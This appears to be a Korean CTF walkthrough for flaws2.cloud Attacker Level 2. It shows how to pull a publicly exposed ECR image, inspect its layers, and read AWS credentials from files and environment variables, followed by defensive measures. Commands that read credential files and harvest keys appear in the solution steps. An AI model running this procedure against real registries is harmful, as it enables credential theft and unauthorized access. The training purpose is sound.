# Attacker Level 2 — 공개 ECR 레포지토리에서 자격증명 추출

> **URL**: http://level2.flaws2.cloud/
> **핵심 기술**: ECR 공개 레포지토리 · Docker 이미지 레이어 분석
> **난이도**: ⭐⭐
> **본인 AWS 계정 필요**: ❌ (Docker 만 있으면 됨)

## 🎯 목표

이 사이트는 컨테이너 이미지로 배포돼 있다. 운영자는 이미지를 저장하는 ECR(Elastic Container Registry) 레포지토리를 **공개** 로 설정했다. 이미지를 pull 해서 **레이어 안에 남은 자격증명·소스 파일** 을 찾고 다음 레벨로 진행한다.

## 🧭 공식 힌트

<details>
<summary><b>Hint 1</b></summary>

> 이 사이트는 ECS Fargate + ECR 로 돌고 있습니다. **이미지가 공개** 되어 있다면 어떤 정보가 노출될까요?

</details>

<details>
<summary><b>Hint 2</b></summary>

> `aws ecr` 계열 명령으로 공개 레포를 검색하거나, `docker pull` 로 직접 가져올 수도 있습니다.

</details>

<details>
<summary><b>Hint 3</b></summary>

> 이미지 내 `Dockerfile`, `entrypoint`, 환경변수에 **AWS 자격증명** 이 남아 있을지 모릅니다. `docker history` 와 `docker run --rm -it <image> sh` 로 안을 뒤지세요.

</details>

## 📚 사전 지식

- **ECR 레포지토리** 는 사설이 기본이지만 `public.ecr.aws` 로 공개 가능. 레포 정책에 `Principal: *` 을 열어 두면 미인증 pull 이 허용된다.
- 이미지는 **레이어** 로 구성된다. 중간에 `RUN` 으로 지운 파일도 그 이전 레이어엔 남아 있다 → `docker history`, `dive` 로 볼 수 있음.
- 실수로 넣은 `AWS_ACCESS_KEY_ID` 환경변수는 **ENV** 레이어에 영구 박제.

## 🔍 정찰

### 1. ECS 계정 ID 확인
Attacker L1 에서 얻은 자격증명으로:
```bash
aws sts get-caller-identity
# Account: 653711331788
```

### 2. 그 계정의 ECR 리포지토리 나열
```bash
aws ecr describe-repositories --region us-east-1
```
출력 예:
```
{ "repositoryName": "level2", "repositoryUri": "653711331788.dkr.ecr.us-east-1.amazonaws.com/level2" }
```

### 3. 리포지토리 정책 확인
```bash
aws ecr get-repository-policy --repository-name level2 --region us-east-1
```
출력:
```json
{
  "Version": "2008-10-17",
  "Statement": [{
    "Effect": "Allow",
    "Principal": "*",
    "Action": ["ecr:BatchGetImage", "ecr:GetDownloadUrlForLayer"]
  }]
}
```
모든 Principal 에게 Pull 허용 — **공개 레포지토리** 이다.

## 🧨 취약점 원리

- Docker 이미지에 **자격증명·내부 URL·DB 덤프** 를 빌드 시 집어넣는 실수는 매우 흔함.
- 이미지가 공개되면 그 안의 모든 **파일시스템 스냅샷** 이 공개된 셈.
- 특히 `COPY` 로 넣은 소스·`.aws/credentials`·`kubeconfig` 등이 문제.

## 🛠 풀이

### 1. Docker 로그인(공개지만 AWS ECR 인증 필요)
```bash
aws ecr get-login-password --region us-east-1 \
  | docker login --username AWS --password-stdin 653711331788.dkr.ecr.us-east-1.amazonaws.com
```

### 2. 이미지 pull
```bash
docker pull 653711331788.dkr.ecr.us-east-1.amazonaws.com/level2:latest
```

### 3. 레이어 히스토리 확인
```bash
docker history --no-trunc 653711331788.dkr.ecr.us-east-1.amazonaws.com/level2:latest
```
중간에 `ENV AWS_SECRET_ACCESS_KEY=...` 같은 레이어가 보이면 바로 그것.

### 4. 이미지 내부 탐색
```bash
docker run --rm -it --entrypoint sh \
  653711331788.dkr.ecr.us-east-1.amazonaws.com/level2:latest
```
```sh
ls /app
cat /app/proxy.js
cat /root/.aws/credentials 2>/dev/null
env | grep AWS
```
발견되는 예:
```
AKIAIUFNQ2WCOPROD  /  <secret>
```

### 5. 얻은 키로 S3 리스팅 → 다음 레벨
```bash
aws configure --profile level2
aws s3 ls --profile level2
# level3-xxxx.flaws2.cloud 가 보임
```
또는 페이지/레포 내 README 에 다음 레벨 URL 이 힌트로 박혀 있기도 하다.

## 🚪 정답 & 다음 레벨

<details>
<summary>정답 펼치기</summary>

- 다음 레벨: **Attacker Level 3** (레포에서 찾은 URL)
- 교훈: **공개 레포에 자격증명·비공개 소스 절대 금지**. 멀티스테이지 빌드로 "빌드 산출물만" 최종 이미지에 남긴다.

</details>

## 🌍 실제 세계 사례

- 2018 년 **Vine** 의 Docker 이미지 공개로 전체 소스 유출.
- GitHub Container Registry·Docker Hub 의 공개 이미지 스캐너가 매일 수천 건의 평문 키를 신고.

## 🛡 방어 대책

### ① 레포지토리 정책에서 `Principal: *` 금지
```bash
aws ecr set-repository-policy --repository-name level2 \
  --policy-text '{"Version":"2012-10-17","Statement":[{"Effect":"Allow","Principal":{"AWS":"arn:aws:iam::222233334444:root"},"Action":"ecr:BatchGetImage"}]}'
```

### ② 멀티스테이지 빌드로 빌드-only 파일 제외
```dockerfile
FROM node:20 AS build
COPY . .
RUN npm ci && npm run build

FROM node:20-slim
COPY --from=build /app/dist ./dist
CMD ["node", "dist/index.js"]
```

### ③ 빌드 시 비밀을 **BuildKit secret** 으로
```dockerfile
# syntax=docker/dockerfile:1.6
RUN --mount=type=secret,id=aws_creds \
    AWS_SHARED_CREDENTIALS_FILE=/run/secrets/aws_creds \
    aws s3 cp s3://my/data /app/data
```
`docker build --secret id=aws_creds,src=~/.aws/credentials ...` 로 전달하면 **최종 이미지에 포함되지 않음**.

### ④ 이미지 스캐닝
- ECR Image Scanning (basic + enhanced)
- `trivy`, `grype` — 로컬에서 빌드 후 비밀 패턴·CVE 검사
- pre-push hook 으로 자동화

### ⑤ CloudTrail 모니터링
`ecr:BatchGetImage` 요청자의 ARN/IP 를 로깅. 외부 IP 가 공개 레포를 대량 pull 하면 경보.

## ✅ 체크리스트

- [ ] `aws ecr get-repository-policy` 로 공개 여부 판정
- [ ] `docker pull` → `history --no-trunc` 재현
- [ ] 이미지 내 `env` 출력에서 자격증명 발견
- [ ] 본인 레포를 공개로 두고 BuildKit secret 로 시크릿 제거 연습

## ⏭ 다음

[← Attacker L1](level-01.md) · [Attacker Level 3 →](level-03.md)
